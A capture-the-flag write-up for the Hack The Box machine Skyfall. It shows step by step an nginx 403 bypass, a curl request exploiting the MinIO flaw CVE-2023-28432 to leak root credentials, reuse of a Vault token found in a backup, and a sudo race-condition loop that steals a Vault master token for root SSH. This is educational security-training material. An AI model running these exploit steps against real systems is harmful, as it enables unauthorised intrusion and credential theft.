---
layout: writeup
category: HTB
description: Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a "Metrics" page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy's password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root.
points: 50
solves: 1848
tags: forbidden-bypass minio-cloud minio-cve CVE-2023-28432 hashicorp-vault vault-ssh sudoers vault-unseal race-condition
date: 2024-09-02
title: HTB Skyfall writeup
comments: false
---

{% raw %}

Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a "Metrics" page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy's password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root.

# Enumeration

## Port recognaissance

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```python
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.9
# Nmap 7.94SVN scan initiated Sun Apr 21 12:52:51 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.254
Nmap scan report for 10.10.11.254
Host is up (0.096s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 21 12:53:16 2024 -- 1 IP address (1 host up) scanned in 25.27 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)


## Web enumeration
            
Taking a look with curl, I can see its using nginx and its about a Sky Storage solution:

```bash
❯ curl -i -s http://10.10.11.254 | less
```
![curl output](/assets/images/Skyfall/curl-output.png)

In the browser, I can see this landing page:

![main page](/assets/images/Skyfall/main-page.png)

The only interesting thing here is this link that goes to demo.skyfall.htb:

![demo link](/assets/images/Skyfall/demo-link.png)

So I will add this line to the /etc/hosts:

```plaintext
10.10.11.254 skyfall.htb demo.skyfall.htb
```

Going to this link brings me to this login page:

![demo.skyfall.htb main page](/assets/images/Skyfall/demo.skyfall.htb-main-page.png)

It gives me credentials to try the demo (guest / guest), so I will introduce them and I gain access to the panel:

![guest dashboard](/assets/images/Skyfall/guest-dashboard.png)

There are some issues and they are talking about Minio Storage. Searching in google, I can see that its about a open source object storage compatible with amazon s3, kubernetes, etc:

![what is minio storage](/assets/images/Skyfall/what-is-minio-storage.png)

I didn't found a minio server still so I will ignore this by now and I will look more the web. Also in the bottom, I can see its made with Flask. There are some functionalities here, which are "Files", "Beta Features", "URL Fetch", "MinIO Metrics", "Feedback" and "Escalate". 

The files link has a utility to upload files and view the ones uploaded. It has a welcome.pdf by default:

![files functionality](/assets/images/Skyfall/files-functionality.png)

Downloading it just shows a welcome pdf with no important information:

![welcome pdf](/assets/images/Skyfall/welcome-pdf.png)

I can also upload some files and download them. For example, I will upload a testing.txt and see its functionalities:

![uploaded file testing.txt](/assets/images/Skyfall/uploaded-file-testing.txt.png)

It has download, delete and rename functionalities. I will ignore them by now.

I can also try to upload something with path traversal like '../../../../../../../../proc/self/cwd/app.py' but its renamed to a secure filename:

![trying to upload app.py in cwd](/assets/images/Skyfall/trying-to-upload-app.py-in-cwd-of-proc.png)

![renamed to safe filename](/assets/images/Skyfall/renamed-to-safe-filename.png)

The "Beta Features" page is forbidden for me (probably because I'm guest user):

![beta feature forbidden](/assets/images/Skyfall/beta-feature-forbidden.png)

The "URL Fetch" option is for downloading file from an URL, and if I put my http server, it makes a request and downloads it into a file:

![uploaded from http server](/assets/images/Skyfall/uploaded-from-http-server.png)

![request to my http server](/assets/images/Skyfall/request-to-my-http-server.png)

Obviously, its also stored in the server and I can view it in the "Files" page and do the same actions with it:

![test.txt visible in Files page](/assets/images/Skyfall/test.txt-visible-in-files-page.png)

The "MinIO metrics" page gives another "403 forbidden" but its different from the one of before. It's a 403 from nginx and the other was probably programmed in flask:

![metrics 403](/assets/images/Skyfall/metrics-403.png)

A nice tool to try to bypass 403 using a lot of techniques is [nomore403](https://github.com/devploit/nomore403), so I will clone it and execute it against the metrics URL:

```bash
❯ git clone https://github.com/devploit/nomore403
Cloning into 'nomore403'...
remote: Enumerating objects: 478, done.
remote: Counting objects: 100% (167/167), done.
remote: Compressing objects: 100% (95/95), done.
remote: Total 478 (delta 74), reused 124 (delta 67), pack-reused 311 (from 1)
Receiving objects: 100% (478/478), 172.53 KiB | 1.14 MiB/s, done.
Resolving deltas: 100% (250/250), done.
❯ cd nomore403
❯ ls
cmd  payloads  go.mod  go.sum  LICENSE  main.go  README.md
❯ go build .
❯ ls
LICENSE  README.md  cmd  go.mod  go.sum  main.go  nomore403  payloads
❯ chmod +x nomore403
```

```bash
❯ ./nomore403 -H "Cookie: session=.eJwljklqBEEMBP9SZx9qVUvzmUZLChuDDd0zJ-O_u8DHyCAhfsqZF-738nheL7yV8yPKo3RuIwcEA-azNzFWA3E1gFcGbeMsVCPEgeiVlT0Rrap1tiTm2YTmWuI0Vk5bM4iO4K4cHZD9bOPwrjIoaq-eqpXhYQ1ZdsjrxvVf0zb6feX5_P7E1x5SJTUN6UZtEC_j6tA44pBVD5mVFD1G-f0D3jZBtg.ZsJoXQ.3_gAJxuz_FOEOl4xmMJ5j4qf4tA" -u http://demo.skyfall.htb/metrics | grep -v 403
Target: 		http://demo.skyfall.htb/metrics
Headers: 		{Cookie  session=.eJwljklqBEEMBP9SZx9qVUvzmUZLChuDDd0zJ-O_u8DHyCAhfsqZF-738nheL7yV8yPKo3RuIwcEA-azNzFWA3E1gFcGbeMsVCPEgeiVlT0Rrap1tiTm2YTmWuI0Vk5bM4iO4K4cHZD9bOPwrjIoaq-eqpXhYQ1ZdsjrxvVf0zb6feX5_P7E1x5SJTUN6UZtEC_j6tA44pBVD5mVFD1G-f0D3jZBtg.ZsJoXQ.3_gAJxuz_FOEOl4xmMJ5j4qf4tA}
Proxy: 			false
Method: 		GET
Payloads folder: 	payloads
Custom bypass IP: 	false
Follow Redirects: 	false
Rate Limit detection: 	false
Status: 		
Timeout (ms): 		6000
Delay (ms): 		0
Techniques: 		verbs, verbs-case, headers, endpaths, midpaths, http-versions, path-case
Unique: 		false
Verbose: 		false

━━━━━━━━━━━━━━━ VERB TAMPERING ━━━━━━━━━━━━━━━
405 	          327 bytes TRACE

━━━━━━━ VERB TAMPERING CASE SWITCHING ━━━━━━━━

━━━━━━━━━━━━━━━━━━ HEADERS ━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━ CUSTOM PATHS ━━━━━━━━━━━━━━━━━
500 	          854 bytes http://demo.skyfall.htb/metrics.html
200 	        45335 bytes http://demo.skyfall.htb/metrics%0A
302 	          428 bytes http://demo.skyfall.htb/#?metrics
302 	          428 bytes http://demo.skyfall.htb/#metrics
302 	          428 bytes http://demo.skyfall.htb///?anythingmetrics
302 	          428 bytes http://demo.skyfall.htb/?metrics
302 	          428 bytes http://demo.skyfall.htb/???metrics
302 	          428 bytes http://demo.skyfall.htb/??metrics

━━━━━━━━━━━━━━━ HTTP VERSIONS ━━━━━━━━━━━━━━━━

━━━━━━━━━━━━ PATH CASE SWITCHING ━━━━━━━━━━━━━

```

It shows a 200 status code using `metrics%0A`, %0A decoded is a line break. This happens probably because this path is configured to be forbidden with nginx, which see that the url does not match with `/metrics` and doesn't do anything to block it. Then, the flask server checks this url and as werkzeug uses the strip function, it results in the /metrics page. Trying it gives us the MinIO metrics page!:

![minio metrics page](/assets/images/Skyfall/minio-metrics-page.png)

> For more information on how this bypass works check [this page](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-flask)

Here its leaked the minio endpoint subdomain at the bottom:

![minio endpoint](/assets/images/Skyfall/minio-endpoint.png)

Also, the version its leaked:

![minio version leaked](/assets/images/Skyfall/minio-version-leaked.png)

After adding it to the /etc/hosts, making a curl against it returns an expected access denied error:

```http
❯ curl -i -sS http://prd23-s3-backend.skyfall.htb/
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 18 Aug 2024 22:16:53 GMT
Content-Type: application/xml
Content-Length: 254
Connection: keep-alive
Accept-Ranges: bytes
Content-Security-Policy: block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
Vary: Accept-Encoding
X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
X-Amz-Request-Id: 17ECF285AAB4E0B3
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><Resource>/</Resource><RequestId>17ECF285AAB4E0B3</RequestId><HostId>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</HostId></Error>
```

The documentation of MinIO is available [here](https://min.io/docs/minio/linux/index.html) and I can see that the tool to interact with a MinIO server is `mc` ([minio client](https://min.io/docs/minio/linux/reference/minio-mc.html)) so first I will install it like specified in the docs:

```bash
❯ curl https://dl.min.io/client/mc/release/linux-amd64/mc --create-dirs -o $HOME/minio-binaries/mc
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 25.9M  100 25.9M    0     0  1720k      0  0:00:15  0:00:15 --:--:-- 1336k
❯ chmod +x $HOME/minio-binaries/mc
```

Now I have it in a folder called minio-binaries in my user's home directory. The documentation also gives instructions on how to create an alias for a MinIO server for later interacting with it. However, I need the access key and secret key, which I don't have:

![create alias MinIO](/assets/images/Skyfall/create-an-alias-minio.png)

[Here](https://min.io/docs/minio/linux/operations/install-deploy-manage/deploy-minio-single-node-single-drive.html) is an example of how to deploy minio and I could try that credentials specified but it won't be so easy:

```bash
❯ /home/gabri/minio-binaries/mc alias set skyfall-minio http://prd23-s3-backend.skyfall.htb myminioadmin minio-secret-key-change-me
mc: <ERROR> Unable to initialize new alias from the provided credentials. The Access Key Id you provided does not exist in our records.
```

Looking for vulnerabilities of minio 2023-03-13T19:46:17Z (version that I saw in the MinIO metrics page), I saw [CVE-2023-28432](https://www.cvedetails.com/cve/CVE-2023-28432/) which is an information disclosure that leaks all the environment variable, including the MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD, which is what I'm searching for:

![minio vulnerable to info disclosure](/assets/images/Skyfall/minio-vulnerable-to-info-disclosure.png)

The MinIO version in this server matches that range between 2019-12-17T23-16-33Z and 2023-03-20T20-16-18Z, so it's vulnerable.

Now, searching for exploits I saw [this one](https://github.com/acheiii/CVE-2023-28432) and the only things that does is make a POST request to /minio/bootstrap/v1/verify:

![poc script just makes a request](/assets/images/Skyfall/poc-script-just-makes-a-request.png)

So I will do it manually with curl:

```bash
❯ curl -sS -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify | jq '.MinioEnv'
```
```json
{
  "MINIO_ACCESS_KEY_FILE": "access_key",
  "MINIO_BROWSER": "off",
  "MINIO_CONFIG_ENV_FILE": "config.env",
  "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
  "MINIO_PROMETHEUS_AUTH_TYPE": "public",
  "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
  "MINIO_ROOT_PASSWORD_FILE": "secret_key",
  "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
  "MINIO_ROOT_USER_FILE": "access_key",
  "MINIO_SECRET_KEY_FILE": "secret_key",
  "MINIO_UPDATE": "off",
  "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
}
```

And I have the MINIO_ROOT_USER and MINIO_ROOT_PASSWORD so I will try to make an alias for this MinIO instance:

```bash
❯ /home/gabri/minio-binaries/mc alias set skyfall-minio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
```
```plaintext
Added `skyfall-minio` successfully.
```

It worked! Now I can run operations with it. The operation to see the buckets and files it [mc ls](https://min.io/docs/minio/linux/reference/minio-mc/mc-ls.html), so I will run it:

```bash
❯ /home/gabri/minio-binaries/mc ls --recursive --versions skyfall-minio
```
![mc ls output](/assets/images/Skyfall/mc-ls-output.png)

And I can see the files belonging to each user and also the ones of guest (which are mine). The most intereseting ones are the different versions of home_backup.tar.gz of askyy. I will start with the one that occupies more as it probably has more data. I will download it using [mc cp](https://min.io/docs/minio/linux/reference/minio-mc/mc-cp.html) and the --version-id parameter:

```bash
❯ /home/gabri/minio-binaries/mc cp skyfall-minio/askyy/home_backup.tar.gz home_backup.tar.gz --vid '3c498578-8dfe-43b7-b679-32a3fe42018f'
```

Decompressing and viewing the contents as expected shows askyy's home:

```bash
❯ mkdir askyy_home_v1
❯ mv home_backup.tar.gz askyy_home_v1
❯ cd askyy_home_v1
❯ tar -xf home_backup.tar.gz
❯ rm home_backup.tar.gz
```
```bash
❯ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .sudo_as_admin_successful	.viminfo  terraform-generator
```

The .ssh directory has an id_rsa but it doesn't work for askyy user:

```plaintext
❯ /bin/ls -a .ssh
.  ..  authorized_keys	id_rsa	id_rsa.pub
❯ ssh -i .ssh/id_rsa askyy@skyfall.htb
The authenticity of host 'skyfall.htb (10.10.11.254)' can't be established.
ED25519 key fingerprint is SHA256:mUK/F6yhenOEZEcLnWWWl3FVk3PiHC8ETKpL3Sz773c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
(askyy@skyfall.htb) Password: 
```

There is nothing more interesting here. I will try version 2 now:

```bash
❯ /home/gabri/minio-binaries/mc cp skyfall-minio/askyy/home_backup.tar.gz home_backup_v2.tar.gz --vid '2b75346d-2a47-4203-ab09-3c9f878466b8'
❯ mkdir askyy_home_v2
❯ mv home_backup_v2.tar.gz askyy_home_v2
❯ cd askyy_home_v2
❯ tar -xf home_backup_v2.tar.gz
❯ rm home_backup_v2.tar.gz
```

Now there isn't any id_rsa:

```bash
❯ /bin/ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .sudo_as_admin_successful
❯ /bin/ls -a .ssh
.  ..  authorized_keys
```

But in the .bashrc, there are two variable exported called "VAULT_API_ADDR" and "VAULT_TOKEN", which are very interesting:

```bash
❯ bat .bashrc
```
![variables exported in bashrc of askyy home v2](/assets/images/Skyfall/variables-exported-in-bashrc-askyy-home.png)

> Note: bat is just a cat with syntax highliting and table format (or not with -p). You can download it from [here](https://github.com/sharkdp/bat)

There is a new host so I will add it to the /etc/hosts.

# Access as askyy

Searching this variables in google makes me think that is using hashicorp vault:

![hashicorp vault page](/assets/images/Skyfall/hashicorp-vault-page.png)

Hashicorp vault is like a secrets management system:

![what is vault](/assets/images/Skyfall/what-is-vault.png)

I will install it like specified [here](https://developer.hashicorp.com/vault/docs/install):

```bash
❯ export GOPATH=$HOME/go
❯ export PATH=$GOPATH/bin:$PATH
❯ mkdir -p $GOPATH/src/github.com/hashicorp && cd $_
❯ git clone https://github.com/hashicorp/vault.git
❯ cd vault
❯ make bootstrap
❯ make dev
```

Now I can execute vault because its in $GOPATH/bin:

```bash
❯ which vault
/home/gabri/go/bin/vault
❯ vault -h
Usage: vault <command> [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit                Interact with audit devices
    auth                 Interact with auth methods
    debug                Runs the debug command
    events               
    hcp                  
    kv                   Interact with Vault's Key-Value storage
    lease                Interact with leases
    monitor              Stream log messages from a Vault server
    namespace            Interact with namespaces
    operator             Perform operator-specific tasks
    patch                Patch data, configuration, and secrets
    path-help            Retrieve API help for paths
    pki                  Interact with Vault's PKI Secrets Engine
    plugin               Interact with Vault plugins and catalog
    policy               Interact with policies
    print                Prints runtime configurations
    proxy                Start a Vault Proxy
    secrets              Interact with secrets engines
    ssh                  Initiate an SSH session
    token                Interact with tokens
    transform            Interact with Vault's Transform Secrets Engine
    transit              Interact with Vault's Transit Secrets Engine
    version-history      Prints the version history of the target Vault server

```

To use vault, I have to export VAULT_ADDR and VAULT_TOKEN, so I will use the ones of the .bashrc of askyy:

```bash
❯ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
❯ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

In the [vault command documentation](https://developer.hashicorp.com/vault/docs/commands), I saw a ssh command which is interesting. It allows connecting with the target machine using one of the ssh secrets engine enabled. It has two modes, one with CA and one with OTP:

![ssh command vault](/assets/images/Skyfall/ssh-command-vault.png)

But I need a valid role and to list it I can use the list command against the route specified [here](https://developer.hashicorp.com/vault/api-docs/secret/ssh#list-roles):

```bash
❯ vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```

And I have two roles, of which dev_otp_key_role works for askyy user:

```bash
❯ vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking no askyy@skyfall.htb
Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug 20 09:46:20 2024 from 10.10.14.106
askyy@skyfall:~$ 
```

> Note: the `-strict-host-key-checking no` is for vault ssh to not check the host certificate because vault uses sshpass to automatize the ssh connection and sshpass its not able to authorize an ssh connection. Another solution can be uninstalling sshpass and entering the OTP manually.

The user flag is available in the user's home:

```bash
askyy@skyfall:~$ cat user.txt 
79****************************f5
```

# Access as root

Looking at the sudo privileges, I can run vault-unseal with some parameters:

```bash
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

That executable is from [here](https://github.com/lrstanley/vault-unseal). Its an utility to unseal vault data using tokens distributed in various instances.

For more information on how hashicorp vault unseals data check [this page](https://developer.hashicorp.com/vault/docs/concepts/seal#auto-unseal) but its not relevant for the exploitation.

Looking at the help panel, I can see for what are the parameters:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```

`-v` is for verbose output, `-c` is to specify the config file and `-d` **outputs debugging info into a file**. I will run it with -v:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

Its saying that the master token was found in config but I don't have access to read it:

```bash
askyy@skyfall:~$ cat /etc/vault-unseal.yaml 
cat: /etc/vault-unseal.yaml: Permission denied
```

The `-d` parameter creates a debug.log in the current directory:

```bash
askyy@skyfall:/tmp$ ls -a
.           .X11-unix         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-logind.service-6IF9X1
..          .XIM-unix         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-resolved.service-g7qYCh
.ICE-unix   .font-unix        systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-timesyncd.service-DjNSEM
.Test-unix  snap-private-tmp  vmware-root_522-2965382515
askyy@skyfall:/tmp$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:/tmp$ ls -a
.          .Test-unix  .font-unix        systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-logind.service-6IF9X1     vmware-root_522-2965382515
..         .X11-unix   debug.log         systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-resolved.service-g7qYCh
.ICE-unix  .XIM-unix   snap-private-tmp  systemd-private-2a289f2479f84c67a890f0d7c7d580c6-systemd-timesyncd.service-DjNSEM
```

But I can't read it because permissions:

```bash
askyy@skyfall:/tmp$ ls -l debug.log 
-rw------- 1 root root 555 Aug 22 15:40 debug.log
askyy@skyfall:/tmp$ cat debug.log 
cat: debug.log: Permission denied
```

However, if the file is removed before writing it, its possible to make a race condition, where if a file `debug.log` its created before vault-unseal writes to it, I will be able to see the contents because it will be owned by me and root will just modify it. For that I need three terminals, one to create the debug.log, other to cat it in a loop and the other to execute the vault-unseal command.

**First terminal**:
```bash
askyy@skyfall:/tmp$ mkdir racecondition
askyy@skyfall:/tmp$ cd racecondition/
askyy@skyfall:/tmp/racecondition$ while true; do touch debug.log 2>/dev/null; rm debug.log; done
```

**Second terminal**:
```bash
askyy@skyfall:/tmp$ while true; do cat /tmp/racecondition/debug.log 2>/dev/null; done
```

**Third terminal**:

```bash
askyy@skyfall:/tmp$ cd /tmp/racecondition
askyy@skyfall:/tmp/racecondition$ while true; do (sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd) &>/dev/null;done
```

It looks like this:

![race condition vault unseal](/assets/images/Skyfall/race-condition-vault-unseal.png)

After running those, in the output of the second terminal, I can see the master token:

```bash
2024/08/22 16:36:09 Initializing logger...
2024/08/22 16:36:09 Reading: /etc/vault-unseal.yaml
2024/08/22 16:36:09 Security Risk!
2024/08/22 16:36:09 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/08/22 16:36:09 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/08/22 16:36:09 Check interval: 5s
2024/08/22 16:36:09 Max checks: 5
2024/08/22 16:36:09 Establishing connection to Vault...
2024/08/22 16:36:09 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/08/22 16:36:09 Checking seal status
2024/08/22 16:36:09 Vault sealed: false
```

So I will export it in my machine and connect as root:

```bash
❯ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
❯ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
❯ vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
❯ vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking no root@skyfall.htb
failed to generate credential: failed to get credentials: Error making API request.

URL: PUT http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
Code: 400. Errors:

* Username is not present is allowed users list
```

That role doesn't work, so I will use the other one (and it makes sense as root is an admin) and it works:

```bash
❯ vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking no root@skyfall.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Aug 22 11:07:34 2024 from 10.10.14.97
root@skyfall:~# 
```

{% endraw %}
